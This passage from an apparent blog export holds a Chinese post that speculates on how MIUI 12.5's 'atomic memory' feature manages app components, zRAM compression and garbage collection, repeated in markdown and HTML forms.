26之前都是逐代继承兼容，但到了30就重新实现了一遍接口，说明30做了一些改动较大的优化。</p>\n"},{"layout":"post","title":"聊一聊MIUI最近更新的原子内存","subtitle":"是黑科技还是噱头？","date":"2021-08-22T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 前言\n\n比起最近雷布斯的个人演讲，其实我更好奇MIUI 12.5增强版（超级Bug-list修复版）推出的那四个性能优化项目：\n\n- 焦点计算 - 处理器智能调度机制\n\n- 原子内存 - 精细化内存管理机制\n\n- 液态存储 - 文件存储管理机制\n\n- 智能均衡 - 对旗舰硬件性能的智能调配\n\n作为技术爱好者，这个“原子内存”还真是提起了我的兴趣，因为其他三项还算比较好理解。毕竟内存管理这件事，是操作系统领域几乎永恒的课题。\n\n## 官方解释\n\n我们先来了解下[MIUI官方网站](https://home.miui.com/)是如何介绍原子内存的。官网的海报动效还是阐释得比较清晰明了（辛苦设计师小姐姐，不知道又加了多少班）。\n\n最开始是几个独立的应用各自占有一定的内存，看看这绿，这不就是微信绿。看看这蓝，支付宝？看看这橙，这啥，淘宝吧估计是，肯定不是小米自己。设计姐姐在疯狂暗示。\n\n![](https://cdn.sspai.com/2021/08/15/9589aa58ccd69abe73eebd4d9803a07d.png)\n\n然后，第二步是**拆分应用内存，结束不重要的任务**，刚才还是整块的内存占用现在在逻辑上被划分为了大小不等（即不同功能占用内存大小不同）的几块。这一步其实就是核心了，如何来划分呢？按什么维度划分呢？有没有可能划分失误反而影响用户体验呢？我们后面来聊。\n\n![](https://cdn.sspai.com/2021/08/15/ae6c6945876364518dbc8eec036e2d2b.png)\n\n第三步，**根据场景，进一步精细压缩**。这一步也很关键，不仅能结束优先级较低的任务，还能对剩余的任务进行内存占用的压缩。听起来有点玄乎，其实问题还是和第二步类似，如何对内存进行压缩？系统如何知道要压缩哪些内容呢？\n\n![](https://cdn.sspai.com/2021/08/15/b3de9b85cae94e7848d445c5fd23b69e.png)\n\n带着上面这些问题，我们来简单聊一聊MIUI可能会如何实现这个原子内存，也即是说，以下内容均是基于个人经验提出的一些猜想，描述尽可能不那么硬核。\n\n## 原理猜想\n\n我们知道，现代操作系统基本都有进程（process）和线程（thread）的概念，用书本上的话说就是：\n\n> 进程是资源分配的最小单位，线程是CPU调度的最小单位。\n\n那么二者的关系，简单概括便是：一个运行中的应用程序就可以包含多个进程，一个进程又可以包含多个线程。\n\n*拿微信举例来说，主功能聊天是一个进程，内置浏览器又是另一个进程，进程之间可以进行通信，但又可以互不影响，比如浏览器崩溃了，不影响你聊天，这也是多进程的好处之一。然后，在聊天进程内部，你下载表情包时会开启另一个线程来完成任务，而不会影响你的UI渲染线程，保证了交互的流畅性，这就是多线程的好处。*\n\n大致了解这些基本概念后，我们就可以继续思考MIUI的原子内存了。\n\nAndroid系统基于Linux，当然也有进程的概念。我们平时俗称的“杀进程”，一般就是指在最近任务中划掉相应的应用来终止其运行，在你划掉的那一瞬间，系统会杀掉此应用相关联的所有进程。而我们俗称的“被杀后台”，就是应用在置于后台且不可见的时候，被系统为了节约内存等资源而杀掉，这对用户而言是一种被动的杀进程，某种程度上比较影响使用体验。\n\n![](https://cdn.sspai.com/2021/08/15/a32183b73145700eb82299cfd47ef07a.png)\n\n在Android的[官方文档](https://developer.android.com/topic/performance/memory-management?hl=zh-cn)中关于内存分配有这么一段话：\n\n> Android 平台在运行时不会浪费可用的内存。它会一直尝试利用所有可用内存。例如，系统会在应用关闭后将其保留在内存中，以便用户快速切回到这些应用。因此，通常情况下，Android 设备在运行时几乎没有可用的内存。要在重要系统进程和许多用户应用之间正确分配内存，内存管理至关重要。\n\n其实这个解释和Apple官方之前建议用户不要频繁地手动杀进程是一个道理。因为应用启动，**进程重新创建的开销是很大的**。此外，接触过Android开发的同学都知道，系统在内存不足的时候也会尽可能地通知各应用，给了你“体面”处理自己的机会。\n\n然而，很多时候国产手机厂商也是不得已而为之，因Android应用可以在后台运行的特性，不管是各类巨无霸应用，还是小而美应用，都在努力让自己在后台保活而不遵守开发规范，生怕用户离它们而去。但这样争奇斗艳的后果就是用户设备续航能力急剧下降，挨骂的往往就是手机系统厂商了。\n\n“原子内存”想解决的便是这个问题，既能让更多的应用不被系统**完全**杀掉，也能减少系统资源的占用，在功耗和功能之间取得一个相对平衡。\n\n### 拆分内存\n\n其实在Android应用层面的开发当中，中小型应用的开发者日常很少会接触到进程的概念，更多的是Android自己抽象的一套开发框架。在其设计架构中，谷歌给开发者和用户提供了“四大组件”：\n\n- Activity - 可简单理解成我们打开的每一个活动页面，用于处理用户交互的逻辑\n\n- Service - 服务，和Activity的逻辑结构类似，只不过没有界面，比如用于播放音乐、下载文件等\n\n- BroadcastReceiver - 可理解为，Android系统就是一个巨大的世界频道，每个应用都可以用小喇叭广播消息，当然也需要接收消息\n\n- ContentProvider - 数据存储和提供的组件，内含标准接口，不同应用之间可通过此来共享内容\n\n感兴趣的同学可以去安装一个叫**LibChecker**的应用，可以查看已安装应用都有哪些以上组件，往往一个应用会包含很多个各种各样的组件，并常以功能的维度来划分。\n\n这些组件是Android开发的基础，对于任意一个组件，它都可以独占一个进程（比如我们上面提到的内置浏览器WebView），也可以和其他组件共享同一个进程，大多数情况都是后者。组件的本质也就是系统创建的一个内存对象，同时，每个组件都有自己的生命周期，在应用进程不被杀掉之前，可以提前结束（比如你打开登录页面完成登录，这个Activity的使命就完成了，可以被系统回收资源）。\n\n![](https://cdn.sspai.com/2021/08/15/35dab82b6279a0d7c3175e2c2b77aaa1.png)\n\n所以在我第一时间看到MIUI原子内存的宣传时，就想到了对四大组件的精细化查杀。拆分内存这一行为可能实质上就是**把应用内的各个组件进行分类并按优先级排序**，销毁低优先级的组件，保证用户可见和正在使用的组件活着就行了，如此就能节省很多内存。当用户需要再次使用某组件时，重新创建启动便是。\n\n*又拿微信来举例，当你扫码支付后，又回到聊天界面，聊了几句再把微信置于后台，这时候你去干别的事情了，系统是不是可以把刚才支付相关的资源都回收掉呢？*\n\n当然，如果销毁和创建的行为过于频繁，也会消耗不少的系统资源，所以我猜测除了设计组件优先级等基本策略，还会有一些机器学习的玩法在里面，**更精准地识别哪些可以被销毁**。在用户使用过程中体验会越来越好，这是一个双向正反馈的过程。\n\n最近在MIUI的官方论坛也看到一些解释提到“进程级”查杀，其实这个就更好理解了，因为本身很多业务相关性强的组件就在同一个进程内，一个大型应用往往有很多进程在同时运行，那么系统也可以杀掉某些暂时用不到的进程（相当于还能一次性销毁多个组件），而非粗暴地杀掉整个应用导致用户回来时一切都要重来。\n\n### 精细压缩\n\n说到压缩，我们可以从最基本的一些解释中了解原理：\n\n> 它就是移除多余的空白字符，插入单个的重复字符指出一个字符串中重复的字符，以及将小型的位串用频繁使用的字符替代。\n\n压缩其实是一个很朴素的概念，当你知道下一秒的画面跟这一秒一致时，是不是可以少存储几帧数据。在内存上，也是类似的方法，它是真正能够节约物理空间的。\n\n在MIUI的海报中，有个非常关键的前提就是：**根据场景**。也就是说，并不是无脑地对所有内存占用进行压缩，而是根据用户使用的场景，**来判断哪些进程或者组件所占用的内存可以压缩，哪些最好不要压缩**，一切以用户体验为前提。这个压缩的策略，和上述的拆分内存类似，可能也会有机器学习的施展空间，当然，用黑白名单来进行简单粗暴的实现也不是不可以。\n\n精细压缩这一步，从Android系统的体系结构来讲，总体可以分为两方面，一是**交换压缩**，二是**垃圾回收**。\n\n#### 交换压缩\n\n先看看官方介绍：\n\n![](https://cdn.sspai.com/2021/08/15/7e080624c9036d6ece5b4c439ee02809.png)\n\n> Android 设备包含三种不同类型的内存：RAM、zRAM 和存储器。\n>\n> - RAM 是最快的内存类型，但其大小通常有限。高端设备通常具有最大的 RAM 容量。\n>\n> - zRAM 是用于交换空间的 RAM 分区。所有数据在放入 zRAM 时都会进行压缩，然后在从 zRAM 向外复制时进行解压缩。这部分 RAM 会随着页面进出 zRAM 而增大或缩小。设备制造商可以设置 zRAM 大小上限。\n>\n> - 存储器中包含所有持久性数据（例如文件系统等），以及为所有应用、库和平台添加的对象代码。存储器比另外两种内存的容量大得多。**在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间（swap），因为频繁写入会导致这种内存出现损坏，并缩短存储媒介的使用寿命**。\n\n我们可以看出，zRAM是内存压缩的关键所在，相当于在内存上划分出一小块区域用于非活跃内存占用的压缩存储。这个“z”，大概就是zip的意思吧。所以，在内存压缩的底层实现上，原生Android已经搞定了，MIUI不需要自行实现这些内存管理机制，最多是**在此基础上根据用户使用场景进行算法优化或者动态调整配置**。\n\n这里特别要注意的是，官方文档提到：**在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间**。这一点也否认了最近网上关于MIUI原子内存的讨论中“就是Linux的swap机制而已”之类的看法。\n\n我个人认为，Linux的swap机制不会特别适用于移动设备，因为移动设备的存储器基本上都是类似SSD的闪存，用作交换空间来存取内存数据是非常减寿的，对手机来说，闪存寿命下降就意味着卡顿。即便是现在的电脑，也不会设置那么大的swap空间甚至不设置了，因为很多电脑内存本身就很大。\n\n#### 垃圾回收\n\n我们每一个应用都运行在一个独立的Android虚拟机之上，所以应用的每一个进程也可叫做虚拟机进程。Android虚拟机可以粗浅地看作Java虚拟机（JVM）的魔改版本，它不能运行原生Java程序。**垃圾回收（GC）是JVM内存管理的核心机制之一**。这里就不赘述了，简单来说就是系统对内存单元的整理和清除。\n\n垃圾回收和刚才的交换压缩一样，它们管理内存的粒度都是“内存页（page）”，而不是进程和Android组件了，对于上层的应用来说，是没有什么感知的，系统底层在默默地自我调节。\n\nMIUI原子内存在垃圾回收层面应该不会去做什么改动，因为GC机制比较底层，而且也相对成熟稳定，MIUI做的事情更多是用户层面的，业务层面的，属于GC的上层调用者。\n\n**精细压缩可能会在何时触发、如何更有效地触发垃圾回收上面下功夫**。\n\n## 后话\n\n做了这么多猜测，其实也没有特别深入的技术细节讨论，但我在查阅研究过程中，还是能感受到MIUI在系统层面的努力，而不仅仅限于做“UI”。毕竟这么花里胡哨的功能命名都唱出来了，怎么也得有点干货才行吧。\n\n此外，写完了我才想到忘了提及以前的Android玩机工具写轮眼，它的主要功能就是由用户自行决定销毁哪些组件，MIUI原子内存或许也从中借鉴了一些思路。\n\n还有一点收获就是，现在我们可以在很多移动设备用户场景遇到AI技术的落地或者是落地的可能性，借此机会，有空的话可以再跟大家聊聊**端侧AI**。\n\n13号当晚我也顺利升级到了这个MIUI 12.5增强版，感受了一下，同时开10个常用App，后台被杀的情况确实有所改善，而且剩余内存也比以前多了。对普通用户来说这就是简单真实的感受，有效果，说明有点东西。\n\n## 参考\n\n- [进程和应用生命周期 | Android Developers](https://developer.android.com/guide/components/activities/process-lifecycle?hl=zh-cn)\n- [进程间的内存分配 | Android Developers](https://developer.android.com/topic/performance/memory-management?hl=zh-cn#low-memory_killer)\n- [如何评价 8 月 10 日小米正式推出的 MIUI 12.5 增强版？](https://www.zhihu.com/question/478811156)\n- [MIUI 最近那个原子内存是什么原理？ - V2EX](https://v2ex.com/t/795335)\n","source":"_posts/2021-08-23-聊一聊MIUI最近更新的原子内存.md","raw":"---\nlayout:     post\ntitle:      聊一聊MIUI最近更新的原子内存\nsubtitle:   是黑科技还是噱头？\ndate:       2021-08-23\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n## 前言\n\n比起最近雷布斯的个人演讲，其实我更好奇MIUI 12.5增强版（超级Bug-list修复版）推出的那四个性能优化项目：\n\n- 焦点计算 - 处理器智能调度机制\n\n- 原子内存 - 精细化内存管理机制\n\n- 液态存储 - 文件存储管理机制\n\n- 智能均衡 - 对旗舰硬件性能的智能调配\n\n作为技术爱好者，这个“原子内存”还真是提起了我的兴趣，因为其他三项还算比较好理解。毕竟内存管理这件事，是操作系统领域几乎永恒的课题。\n\n## 官方解释\n\n我们先来了解下[MIUI官方网站](https://home.miui.com/)是如何介绍原子内存的。官网的海报动效还是阐释得比较清晰明了（辛苦设计师小姐姐，不知道又加了多少班）。\n\n最开始是几个独立的应用各自占有一定的内存，看看这绿，这不就是微信绿。看看这蓝，支付宝？看看这橙，这啥，淘宝吧估计是，肯定不是小米自己。设计姐姐在疯狂暗示。\n\n![](https://cdn.sspai.com/2021/08/15/9589aa58ccd69abe73eebd4d9803a07d.png)\n\n然后，第二步是**拆分应用内存，结束不重要的任务**，刚才还是整块的内存占用现在在逻辑上被划分为了大小不等（即不同功能占用内存大小不同）的几块。这一步其实就是核心了，如何来划分呢？按什么维度划分呢？有没有可能划分失误反而影响用户体验呢？我们后面来聊。\n\n![](https://cdn.sspai.com/2021/08/15/ae6c6945876364518dbc8eec036e2d2b.png)\n\n第三步，**根据场景，进一步精细压缩**。这一步也很关键，不仅能结束优先级较低的任务，还能对剩余的任务进行内存占用的压缩。听起来有点玄乎，其实问题还是和第二步类似，如何对内存进行压缩？系统如何知道要压缩哪些内容呢？\n\n![](https://cdn.sspai.com/2021/08/15/b3de9b85cae94e7848d445c5fd23b69e.png)\n\n带着上面这些问题，我们来简单聊一聊MIUI可能会如何实现这个原子内存，也即是说，以下内容均是基于个人经验提出的一些猜想，描述尽可能不那么硬核。\n\n## 原理猜想\n\n我们知道，现代操作系统基本都有进程（process）和线程（thread）的概念，用书本上的话说就是：\n\n> 进程是资源分配的最小单位，线程是CPU调度的最小单位。\n\n那么二者的关系，简单概括便是：一个运行中的应用程序就可以包含多个进程，一个进程又可以包含多个线程。\n\n*拿微信举例来说，主功能聊天是一个进程，内置浏览器又是另一个进程，进程之间可以进行通信，但又可以互不影响，比如浏览器崩溃了，不影响你聊天，这也是多进程的好处之一。然后，在聊天进程内部，你下载表情包时会开启另一个线程来完成任务，而不会影响你的UI渲染线程，保证了交互的流畅性，这就是多线程的好处。*\n\n大致了解这些基本概念后，我们就可以继续思考MIUI的原子内存了。\n\nAndroid系统基于Linux，当然也有进程的概念。我们平时俗称的“杀进程”，一般就是指在最近任务中划掉相应的应用来终止其运行，在你划掉的那一瞬间，系统会杀掉此应用相关联的所有进程。而我们俗称的“被杀后台”，就是应用在置于后台且不可见的时候，被系统为了节约内存等资源而杀掉，这对用户而言是一种被动的杀进程，某种程度上比较影响使用体验。\n\n![](https://cdn.sspai.com/2021/08/15/a32183b73145700eb82299cfd47ef07a.png)\n\n在Android的[官方文档](https://developer.android.com/topic/performance/memory-management?hl=zh-cn)中关于内存分配有这么一段话：\n\n> Android 平台在运行时不会浪费可用的内存。它会一直尝试利用所有可用内存。例如，系统会在应用关闭后将其保留在内存中，以便用户快速切回到这些应用。因此，通常情况下，Android 设备在运行时几乎没有可用的内存。要在重要系统进程和许多用户应用之间正确分配内存，内存管理至关重要。\n\n其实这个解释和Apple官方之前建议用户不要频繁地手动杀进程是一个道理。因为应用启动，**进程重新创建的开销是很大的**。此外，接触过Android开发的同学都知道，系统在内存不足的时候也会尽可能地通知各应用，给了你“体面”处理自己的机会。\n\n然而，很多时候国产手机厂商也是不得已而为之，因Android应用可以在后台运行的特性，不管是各类巨无霸应用，还是小而美应用，都在努力让自己在后台保活而不遵守开发规范，生怕用户离它们而去。但这样争奇斗艳的后果就是用户设备续航能力急剧下降，挨骂的往往就是手机系统厂商了。\n\n“原子内存”想解决的便是这个问题，既能让更多的应用不被系统**完全**杀掉，也能减少系统资源的占用，在功耗和功能之间取得一个相对平衡。\n\n### 拆分内存\n\n其实在Android应用层面的开发当中，中小型应用的开发者日常很少会接触到进程的概念，更多的是Android自己抽象的一套开发框架。在其设计架构中，谷歌给开发者和用户提供了“四大组件”：\n\n- Activity - 可简单理解成我们打开的每一个活动页面，用于处理用户交互的逻辑\n\n- Service - 服务，和Activity的逻辑结构类似，只不过没有界面，比如用于播放音乐、下载文件等\n\n- BroadcastReceiver - 可理解为，Android系统就是一个巨大的世界频道，每个应用都可以用小喇叭广播消息，当然也需要接收消息\n\n- ContentProvider - 数据存储和提供的组件，内含标准接口，不同应用之间可通过此来共享内容\n\n感兴趣的同学可以去安装一个叫**LibChecker**的应用，可以查看已安装应用都有哪些以上组件，往往一个应用会包含很多个各种各样的组件，并常以功能的维度来划分。\n\n这些组件是Android开发的基础，对于任意一个组件，它都可以独占一个进程（比如我们上面提到的内置浏览器WebView），也可以和其他组件共享同一个进程，大多数情况都是后者。组件的本质也就是系统创建的一个内存对象，同时，每个组件都有自己的生命周期，在应用进程不被杀掉之前，可以提前结束（比如你打开登录页面完成登录，这个Activity的使命就完成了，可以被系统回收资源）。\n\n![](https://cdn.sspai.com/2021/08/15/35dab82b6279a0d7c3175e2c2b77aaa1.png)\n\n所以在我第一时间看到MIUI原子内存的宣传时，就想到了对四大组件的精细化查杀。拆分内存这一行为可能实质上就是**把应用内的各个组件进行分类并按优先级排序**，销毁低优先级的组件，保证用户可见和正在使用的组件活着就行了，如此就能节省很多内存。当用户需要再次使用某组件时，重新创建启动便是。\n\n*又拿微信来举例，当你扫码支付后，又回到聊天界面，聊了几句再把微信置于后台，这时候你去干别的事情了，系统是不是可以把刚才支付相关的资源都回收掉呢？*\n\n当然，如果销毁和创建的行为过于频繁，也会消耗不少的系统资源，所以我猜测除了设计组件优先级等基本策略，还会有一些机器学习的玩法在里面，**更精准地识别哪些可以被销毁**。在用户使用过程中体验会越来越好，这是一个双向正反馈的过程。\n\n最近在MIUI的官方论坛也看到一些解释提到“进程级”查杀，其实这个就更好理解了，因为本身很多业务相关性强的组件就在同一个进程内，一个大型应用往往有很多进程在同时运行，那么系统也可以杀掉某些暂时用不到的进程（相当于还能一次性销毁多个组件），而非粗暴地杀掉整个应用导致用户回来时一切都要重来。\n\n### 精细压缩\n\n说到压缩，我们可以从最基本的一些解释中了解原理：\n\n> 它就是移除多余的空白字符，插入单个的重复字符指出一个字符串中重复的字符，以及将小型的位串用频繁使用的字符替代。\n\n压缩其实是一个很朴素的概念，当你知道下一秒的画面跟这一秒一致时，是不是可以少存储几帧数据。在内存上，也是类似的方法，它是真正能够节约物理空间的。\n\n在MIUI的海报中，有个非常关键的前提就是：**根据场景**。也就是说，并不是无脑地对所有内存占用进行压缩，而是根据用户使用的场景，**来判断哪些进程或者组件所占用的内存可以压缩，哪些最好不要压缩**，一切以用户体验为前提。这个压缩的策略，和上述的拆分内存类似，可能也会有机器学习的施展空间，当然，用黑白名单来进行简单粗暴的实现也不是不可以。\n\n精细压缩这一步，从Android系统的体系结构来讲，总体可以分为两方面，一是**交换压缩**，二是**垃圾回收**。\n\n#### 交换压缩\n\n先看看官方介绍：\n\n![](https://cdn.sspai.com/2021/08/15/7e080624c9036d6ece5b4c439ee02809.png)\n\n> Android 设备包含三种不同类型的内存：RAM、zRAM 和存储器。\n>\n> - RAM 是最快的内存类型，但其大小通常有限。高端设备通常具有最大的 RAM 容量。\n>\n> - zRAM 是用于交换空间的 RAM 分区。所有数据在放入 zRAM 时都会进行压缩，然后在从 zRAM 向外复制时进行解压缩。这部分 RAM 会随着页面进出 zRAM 而增大或缩小。设备制造商可以设置 zRAM 大小上限。\n>\n> - 存储器中包含所有持久性数据（例如文件系统等），以及为所有应用、库和平台添加的对象代码。存储器比另外两种内存的容量大得多。**在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间（swap），因为频繁写入会导致这种内存出现损坏，并缩短存储媒介的使用寿命**。\n\n我们可以看出，zRAM是内存压缩的关键所在，相当于在内存上划分出一小块区域用于非活跃内存占用的压缩存储。这个“z”，大概就是zip的意思吧。所以，在内存压缩的底层实现上，原生Android已经搞定了，MIUI不需要自行实现这些内存管理机制，最多是**在此基础上根据用户使用场景进行算法优化或者动态调整配置**。\n\n这里特别要注意的是，官方文档提到：**在 Android 上，存储器不像在其他 Linux 实现上那样用于交换空间**。这一点也否认了最近网上关于MIUI原子内存的讨论中“就是Linux的swap机制而已”之类的看法。\n\n我个人认为，Linux的swap机制不会特别适用于移动设备，因为移动设备的存储器基本上都是类似SSD的闪存，用作交换空间来存取内存数据是非常减寿的，对手机来说，闪存寿命下降就意味着卡顿。即便是现在的电脑，也不会设置那么大的swap空间甚至不设置了，因为很多电脑内存本身就很大。\n\n#### 垃圾回收\n\n我们每一个应用都运行在一个独立的Android虚拟机之上，所以应用的每一个进程也可叫做虚拟机进程。Android虚拟机可以粗浅地看作Java虚拟机（JVM）的魔改版本，它不能运行原生Java程序。**垃圾回收（GC）是JVM内存管理的核心机制之一**。这里就不赘述了，简单来说就是系统对内存单元的整理和清除。\n\n垃圾回收和刚才的交换压缩一样，它们管理内存的粒度都是“内存页（page）”，而不是进程和Android组件了，对于上层的应用来说，是没有什么感知的，系统底层在默默地自我调节。\n\nMIUI原子内存在垃圾回收层面应该不会去做什么改动，因为GC机制比较底层，而且也相对成熟稳定，MIUI做的事情更多是用户层面的，业务层面的，属于GC的上层调用者。\n\n**精细压缩可能会在何时触发、如何更有效地触发垃圾回收上面下功夫**。\n\n## 后话\n\n做了这么多猜测，其实也没有特别深入的技术细节讨论，但我在查阅研究过程中，还是能感受到MIUI在系统层面的努力，而不仅仅限于做“UI”。毕竟这么花里胡哨的功能命名都唱出来了，怎么也得有点干货才行吧。\n\n此外，写完了我才想到忘了提及以前的Android玩机工具写轮眼，它的主要功能就是由用户自行决定销毁哪些组件，MIUI原子内存或许也从中借鉴了一些思路。\n\n还有一点收获就是，现在我们可以在很多移动设备用户场景遇到AI技术的落地或者是落地的可能性，借此机会，有空的话可以再跟大家聊聊**端侧AI**。\n\n13号当晚我也顺利升级到了这个MIUI 12.5增强版，感受了一下，同时开10个常用App，后台被杀的情况确实有所改善，而且剩余内存也比以前多了。对普通用户来说这就是简单真实的感受，有效果，说明有点东西。\n\n## 参考\n\n- [进程和应用生命周期 | Android Developers](https://developer.android.com/guide/components/activities/process-lifecycle?hl=zh-cn)\n- [进程间的内存分配 | Android Developers](https://developer.android.com/topic/performance/memory-management?hl=zh-cn#low-memory_killer)\n- [如何评价 8 月 10 日小米正式推出的 MIUI 12.5 增强版？](https://www.zhihu.com/question/478811156)\n- [MIUI 最近那个原子内存是什么原理？ - V2EX](https://v2ex.com/t/795335)\n","slug":"聊一聊MIUI最近更新的原子内存","published":1,"updated":"2024-03-25T07:31:25.985Z","comments":1,"photos":[],"link":"","_id":"cluaufh1f0044the66l5d9aba","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>比起最近雷布斯的个人演讲，其实我更好奇MIUI 12.5增强版（超级Bug-list修复版）推出的那四个性能优化项目：</p>\n<ul>\n<li><p>焦点计算 - 处理器智能调度机制</p>\n</li>\n<li><p>原子内存 - 精细化内存管理机制</p>\n</li>\n<li><p>液态存储 - 文件存储管理机制</p>\n</li>\n<li><p>智能均衡 - 对旗舰硬件性能的智能调配</p>\n</li>\n</ul>\n<p>作为技术爱好者，这个“原子内存”还真是提起了我的兴趣，因为其他三项还算比较好理解。毕竟内存管理这件事，是操作系统领域几乎永恒的课题。</p>\n<h2 id=\"官方解释\"><a href=\"#官方解释\" class=\"headerlink\" title=\"官方解释\"></a>官方解释</h2><p>我们先来了解下<a href=\"https://home.miui.com/\">MIUI官方网站</a>是如何介绍原子内存的。官网的海报动效还是阐释得比较清晰明了（辛苦设计师小姐姐，不知道又加了多少班）。</p>\n<p>最开始是几个独立的应用各自占有一定的内存，看看这绿，这不就是微信绿。看看这蓝，支付宝？看看这橙，这啥，淘宝吧估计是，肯定不是小米自己。设计姐姐在疯狂暗示。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/9589aa58ccd69abe73eebd4d9803a07d.png\"></p>\n<p>然后，第二步是<strong>拆分应用内存，结束不重要的任务</strong>，刚才还是整块的内存占用现在在逻辑上被划分为了大小不等（即不同功能占用内存大小不同）的几块。这一步其实就是核心了，如何来划分呢？按什么维度划分呢？有没有可能划分失误反而影响用户体验呢？我们后面来聊。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/ae6c6945876364518dbc8eec036e2d2b.png\"></p>\n<p>第三步，<strong>根据场景，进一步精细压缩</strong>。这一步也很关键，不仅能结束优先级较低的任务，还能对剩余的任务进行内存占用的压缩。听起来有点玄乎，其实问题还是和第二步类似，如何对内存进行压缩？系统如何知道要压缩哪些内容呢？</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/b3de9b85cae94e7848d445c5fd23b69e.png\"></p>\n<p>带着上面这些问题，我们来简单聊一聊MIUI可能会如何实现这个原子内存，也即是说，以下内容均是基于个人经验提出的一些猜想，描述尽可能不那么硬核。</p>\n<h2 id=\"原理猜想\"><a href=\"#原理猜想\" class=\"headerlink\" title=\"原理猜想\"></a>原理猜想</h2><p>我们知道，现代操作系统基本都有进程（process）和线程（thread）的概念，用书本上的话说就是：</p>\n<blockquote>\n<p>进程是资源分配的最小单位，线程是CPU调度的最小单位。</p>\n</blockquote>\n<p>那么二者的关系，简单概括便是：一个运行中的应用程序就可以包含多个进程，一个进程又可以包含多个线程。</p>\n<p><em>拿微信举例来说，主功能聊天是一个进程，内置浏览器又是另一个进程，进程之间可以进行通信，但又可以互不影响，比如浏览器崩溃了，不影响你聊天，这也是多进程的好处之一。然后，在聊天进程内部，你下载表情包时会开启另一个线程来完成任务，而不会影响你的UI渲染线程，保证了交互的流畅性，这就是多线程的好处。</em></p>\n<p>大致了解这些基本概念后，我们就可以继续思考MIUI的原子内存了。</p>\n<p>Android系统基于Linux，当然也有进程的概念。我们平时俗称的“杀进程”，一般就是指在最近任务中划掉相应的应用来终止其运行，在你划掉的那一瞬间，系统会杀掉此应用相关联的所有进程。而我们俗称的“被杀后台”，就是应用在置于后台且不可见的时候，被系统为了节约内存等资源而杀掉，这对用户而言是一种被动的杀进程，某种程度上比较影响使用体验。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/a32183b73145700eb82299cfd47ef07a.png\"></p>\n<p>在Android的<a href=\"https://developer.android.com/topic/performance/memory-management?hl=zh-cn\">官方文档</a>中关于内存分配有这么一段话：</p>\n<blockquote>\n<p>Android 平台在运行时不会浪费可用的内存。它会一直尝试利用所有可用内存。例如，系统会在应用关闭后将其保留在内存中，以便用户快速切回到这些应用。因此，通常情况下，Android 设备在运行时几乎没有可用的内存。要在重要系统进程和许多用户应用之间正确分配内存，内存管理至关重要。</p>\n</blockquote>\n<p>其实这个解释和Apple官方之前建议用户不要频繁地手动杀进程是一个道理。因为应用启动，<strong>进程重新创建的开销是很大的</strong>。此外，接触过Android开发的同学都知道，系统在内存不足的时候也会尽可能地通知各应用，给了你“体面”处理自己的机会。</p>\n<p>然而，很多时候国产手机厂商也是不得已而为之，因Android应用可以在后台运行的特性，不管是各类巨无霸应用，还是小而美应用，都在努力让自己在后台保活而不遵守开发规范，生怕用户离它们而去。但这样争奇斗艳的后果就是用户设备续航能力急剧下降，挨骂的往往就是手机系统厂商了。</p>\n<p>“原子内存”想解决的便是这个问题，既能让更多的应用不被系统<strong>完全</strong>杀掉，也能减少系统资源的占用，在功耗和功能之间取得一个相对平衡。</p>\n<h3 id=\"拆分内存\"><a href=\"#拆分内存\" class=\"headerlink\" title=\"拆分内存\"></a>拆分内存</h3><p>其实在Android应用层面的开发当中，中小型应用的开发者日常很少会接触到进程的概念，更多的是Android自己抽象的一套开发框架。在其设计架构中，谷歌给开发者和用户提供了“四大组件”：</p>\n<ul>\n<li><p>Activity - 可简单理解成我们打开的每一个活动页面，用于处理用户交互的逻辑</p>\n</li>\n<li><p>Service - 服务，和Activity的逻辑结构类似，只不过没有界面，比如用于播放音乐、下载文件等</p>\n</li>\n<li><p>BroadcastReceiver - 可理解为，Android系统就是一个巨大的世界频道，每个应用都可以用小喇叭广播消息，当然也需要接收消息</p>\n</li>\n<li><p>ContentProvider - 数据存储和提供的组件，内含标准接口，不同应用之间可通过此来共享内容</p>\n</li>\n</ul>\n<p>感兴趣的同学可以去安装一个叫<strong>LibChecker</strong>的应用，可以查看已安装应用都有哪些以上组件，往往一个应用会包含很多个各种各样的组件，并常以功能的维度来划分。</p>\n<p>这些组件是Android开发的基础，对于任意一个组件，它都可以独占一个进程（比如我们上面提到的内置浏览器WebView），也可以和其他组件共享同一个进程，大多数情况都是后者。组件的本质也就是系统创建的一个内存对象，同时，每个组件都有自己的生命周期，在应用进程不被杀掉之前，可以提前结束（比如你打开登录页面完成登录，这个Activity的使命就完成了，可以被系统回收资源）。</p>\n<p><img src=\"https://cdn.sspai.com/2021/08/15/35dab82b6279a0d7c3175e2c2b77aaa1.png\"></p>\n<p>所以在我第一时间看到MIUI原子内存的宣传时，就想到了对四大组件的精细化查杀。拆分内存这一行为可能实质上就是<strong>把应用内的各个组件进行分类并按优先级排序</strong>，销毁低优先级的组件，保证用户可见和正在使用的组件活着就行了，如此就能节省很多内存。当用户需要再次使用某组件时，重新创建启动便是。</p>\n<p><em>又拿微信来举例，当你扫码支付后，又回到聊天界面，聊了几句再把微信置于后台，这时候你去干别的事情了，系统是不是可以把刚才支付相关的资源都回收掉呢？</em></p>\n<p>当然，如果销毁和创建的行为过于频繁，也会消耗不少的系统资源，所以我猜测除了设计组件优先级等基本策略，还会有一些机器学习的玩法在里面，<strong>更精准地识别哪些可以被销毁</strong>。在用户使用过程中体验会越来越好，这是一个双向正反馈的过程。</p>\n<p>最近在MIUI的官方论坛也看到一些解释提到“进程级”查杀，其实这个就更好理解了，因为本身很多业务相关性强的组件就在同一个进程内，一个大型应用往往有很多进程在同时运行，那么系统也可以杀掉某些暂时用不到的进程（相当于还能一次性销毁多个组件），而非粗暴地杀掉整个应用导致用户回来时一切都要重来。</p>\n<h3 id=\"精细压缩\"><a href=\"#精细压缩\" class=\"headerlink\" 